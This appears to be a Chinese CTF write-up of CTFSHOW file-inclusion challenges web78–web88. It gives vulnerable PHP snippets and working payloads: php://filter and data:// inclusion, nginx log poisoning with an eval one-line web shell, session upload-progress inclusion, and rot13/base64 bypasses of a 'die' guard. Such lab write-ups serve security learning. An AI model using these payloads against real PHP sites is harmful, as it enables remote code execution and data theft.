# CTFSHOW 文件包含

**目录**

[TOC]





## web78   php://filter

```cobol
 <?php
 
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 10:52:43
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 10:54:20
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
 
*/
 
 
if(isset($_GET['file'])){
    $file = $_GET['file'];
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

包含一个文件

发现了 include 我们可以配合伪协议来读取flag

```cobol
php://filter/read=convert.base64-encode/resource=flag.php
```

```cobol
PD9waHANCg0KLyoNCiMgLSotIGNvZGluZzogdXRmLTggLSotDQojIEBBdXRob3I6IGgxeGENCiMgQERhdGU6ICAgMjAyMC0wOS0xNiAxMDo1NToxMQ0KIyBATGFzdCBNb2RpZmllZCBieTogICBoMXhhDQojIEBMYXN0IE1vZGlmaWVkIHRpbWU6IDIwMjAtMDktMTYgMTA6NTU6MjANCiMgQGVtYWlsOiBoMXhhQGN0ZmVyLmNvbQ0KIyBAbGluazogaHR0cHM6Ly9jdGZlci5jb20NCg0KKi8NCg0KDQokZmxhZz0iY3Rmc2hvd3s3MDQ4ZDgyOC0yYzBiLTQzZDAtYmRjYi02OTNmNWVhMjI3Yzh9Ijs=
```

解码



<img src="https://i-blog.csdnimg.cn/blog_migrate/704cff131ffd58acccd04ae279007962.png" alt="" style="max-height:394px; box-sizing:content-box;" />


## web79  data://text/plain

```cobol
 <?php
 
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:10:14
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:12:38
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
 
*/
 
 
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

过滤了 将php过滤 为 ？？？

那我们通过 data协议直接执行查询代码

```cobol
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==
 
ls
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/78ec6bb5eddd96011f98adfd71d05130.png" alt="" style="max-height:122px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/25b14d745de61376e24a5eb7a5755484.png" alt="" style="max-height:564px; box-sizing:content-box;" />


读取flag

```cobol
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/ec77fc0e80b00b13f6821d2020e912e2.png" alt="" style="max-height:73px; box-sizing:content-box;" />


## web80  日志文件包含

```cobol
 <?php
 
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 11:26:29
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
 
*/
 
 
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

首先使用插件查看服务



<img src="https://i-blog.csdnimg.cn/blog_migrate/743ec19b12c7c82dbbe6600826ac01ba.png" alt="" style="max-height:209px; box-sizing:content-box;" />


发现是使用nginx的服务器那么一般日志文件是存在

```cobol
var/log/nginx/access.log
```

那我们看看去访问文件



<img src="https://i-blog.csdnimg.cn/blog_migrate/9f50b324d47633316a91a158b2ec41a7.png" alt="" style="max-height:191px; box-sizing:content-box;" />


发现能读取 那我们传入 命令

看看能不能解析



<img src="https://i-blog.csdnimg.cn/blog_migrate/c29e6415a1eab0bc700f861eaae3cecc.png" alt="" style="max-height:56px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/5610b4d887e1433dcaf0e9270ebf6be3.png" alt="" style="max-height:363px; box-sizing:content-box;" />


那就很简单了 直接通过 一句话木马上传即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/3044dfe6ec55c0a8acebf9e9d92a2a4d.png" alt="" style="max-height:194px; box-sizing:content-box;" />




<img src="https://i-blog.csdnimg.cn/blog_migrate/adfedc646f5078bec6b644729230c8f1.png" alt="" style="max-height:236px; box-sizing:content-box;" />


```cobol
1=system('tac /var/www/html/fl0g.php');
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/247c9c98e0e77b1d0083d6b98a29bbbb.png" alt="" style="max-height:235px; box-sizing:content-box;" />


## web81

```cobol
 <?php
 
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 15:51:31
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
 
*/
 
 
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

发现还是可以使用日志包含

访问 /var/log/nginx/access/log

上传一句话木马

```php
<?php @eval($_GET[1]);?>
```

```cobol
/?file=/var/log/nginx/access.log&1=system('ls /var/www/html');
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/6f52975b240f5fe29a7b0a1f4cef31d3.png" alt="" style="max-height:106px; box-sizing:content-box;" />


```cobol
/?file=/var/log/nginx/access.log&1=system('tac /var/www/html/fl0g.php');
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/a3eb46df097aa74a917995c4e6c09630.png" alt="" style="max-height:138px; box-sizing:content-box;" />


## web82-86  session 文件包含

```cobol
 <?php
 
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 19:34:45
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
 
*/
 
 
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    include($file);
}else{
    highlight_file(__FILE__);
} 
```

过滤了 .

那么 我们就无法使用 带有后缀的文件了

那在 php中 可以使用无后缀的 就是 session文件

这里就需要使用两个东西

```undefined
session.upload_progress
 
 
PHP_SESSION_UPLOAD_PROGRESS 参数
```

再了解 session.upload_progress是我们先了解 php.ini的参数

```cobol
session.upload_progress.enable = on
浏览器向服务器上传文件的时候 会将上传信息存储在session中
 
session.upload_progress.cleanup = on
在上传成功后 服务器会cleanup文件 清除session里面的内容
 
session.upload_progress.prefix = "upload_progress_"
session里面的键名
 
session.upload_progress.name = "PHP_SESSION_UPLOAD_PROGRESS"
如果name出现在表单中 那么就会报告上传进度
```

接下来我们分析过程

```cobol
如果我们php.ini设置session.auto_start为on
 
php在接受到请求就会自动初始化 session 所以不需要执行 session start()
 
但是默认情况下 session.auto_start 都是关闭的
 
但是session还存在一个默认选项session.use_strict_mode默认值是为0
 
这个时候 用户可以自定义Session ID
 
 
例如
 
我设置 cookie:PHPSESSID=Xio
 
 
那么这个时候 会在服务器创建一个文件 /tmp/sess_Xio
 
即使用户自己没有初始化 但是php也会自动初始化session
 
并且产生一个键值 ini.get(“session.upload_progress.prefix”)+session.upload_progress.name
 
 
总结
 
我们写入的PHPSESSID会被当做文件名
```

这里又需要使用条件竞争来实现访问

## web87 死亡代码 绕过  rot13 base64

```cobol
 <?php
 
/*
# -*- coding: utf-8 -*-
# @Author: h1xa
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-09-16 21:57:55
# @email: h1xa@ctfer.com
# @link: https://ctfer.com
 
*/
 
if(isset($_GET['file'])){
    $file = $_GET['file'];
    $content = $_POST['content'];
    $file = str_replace("php", "???", $file);
    $file = str_replace("data", "???", $file);
    $file = str_replace(":", "???", $file);
    $file = str_replace(".", "???", $file);
    file_put_contents(urldecode($file), "<?php die('大佬别秀了');?>".$content);
 
    
}else{
    highlight_file(__FILE__);
} 
```

 [file_put_content和死亡·杂糅代码之缘 - 先知社区](https://xz.aliyun.com/t/8163) 

出现了一个 死亡代码

在我们写入文件的时候 会先执行<?php die('大佬别秀了');?>

那我们怎么绕过呢

首先就是加密方式

我们可以通过 rot13绕过

那我们怎么绕过 过滤php正则呢 只需要通过 url编码两次绕过即可

### rot13

```cobol
php://filter/write=string.rot13/resource=2.php
 
两次url
%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%37%33%25%37%34%25%37%32%25%36%39%25%36%65%25%36%37%25%32%65%25%37%32%25%36%66%25%37%34%25%33%31%25%33%33%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%32%25%32%65%25%37%30%25%36%38%25%37%30
```

然后就是content的内容了

我们只需要 将 content内容 进行 rot13编码

然后即可



<img src="https://i-blog.csdnimg.cn/blog_migrate/bddef28591adfc2901f33f5144d55d58.png" alt="" style="max-height:575px; box-sizing:content-box;" />




```ruby
<?cuc flfgrz('yf');?>
```

然后执行访问 2.php



<img src="https://i-blog.csdnimg.cn/blog_migrate/dc39e49a705d2b44e911edcd2bf9d17c.png" alt="" style="max-height:131px; box-sizing:content-box;" />


再次修改访问 fl0g.php即可

```ruby
<?cuc flfgrz('gnp sy0t.cuc');?>
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/cd0b7ceae40cc59b4ab7b33eb7ec80c9.png" alt="" style="max-height:173px; box-sizing:content-box;" />


### base64

我们get的内容已经实现了 那我们看看怎么绕过死亡代码

```php
我们输入 <?php system('tac fl0g.php');?>
 
就会结合为 <?php die('大佬别秀了');?><?php system('tac fl0g.php');?>
直接退出
 
如果我们使用base64的话
 
<?php die('大佬别秀了');?> 只会解码 php  和 die 指令 
 
 
而base64通常是8个一组 phpdie只有6个 所以我们随便补充两个来保证解码
 
aaPD9waHAgc3lzdGVtKCdscycpOz8+
 
这个时候 base64解码就是
 
phpdieaaPD9waHAgc3lzdGVtKCdscycpOz8+
 
其中phpdieaa 会解码失败 从而绕过 死亡代码
```

所以我们来进行写入

```cobol
POST
content=aaPD9waHAgc3lzdGVtKCdscycpOz8+
 
GET
 
?file=php://filter/write=convert.base64-decode/resource=flag.php
 
 
 
?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%36%36%25%36%63%25%36%31%25%36%37%25%32%65%25%37%30%25%36%38%25%37%30
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/f77c13e45473b7207a074f552c1e60b0.png" alt="" style="max-height:163px; box-sizing:content-box;" />


修改文件名 然后写入 读取命令即可

```cobol
POST
content=aa<?php system('tac fl0g.php');?>
 
content=aaPD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTs/Pg==
 
GET
 
?file=php://filter/write=convert.base64-decode/resource=5.php
 
 
 
?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%34%25%32%65%25%37%30%25%36%38%25%37%30
 
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/759e3a1e0399601bb5baca7fce4e6815.png" alt="" style="max-height:223px; box-sizing:content-box;" />


这样就绕过了死亡代码

## web88

可以使用data协议来执行

```cobol
?file=data://text/plain;base64,PD9waHAgICBzeXN0ZW0oIm5sICoucGhwIik7
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/87644477b8e937221512a6cff5ffe21e.png" alt="" style="max-height:200px; box-sizing:content-box;" />